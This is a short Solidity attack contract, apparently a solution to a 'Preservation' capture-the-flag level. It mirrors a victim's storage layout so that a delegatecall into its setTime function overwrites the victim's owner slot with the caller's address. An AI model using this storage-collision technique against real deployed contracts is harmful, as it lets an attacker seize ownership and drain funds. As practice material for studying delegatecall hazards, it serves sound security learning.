contract PreservationAttack {
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;
  uint storedTime;

  function setTime(uint _time) public {
    owner = msg.sender;
    storedTime = _time;
  }
}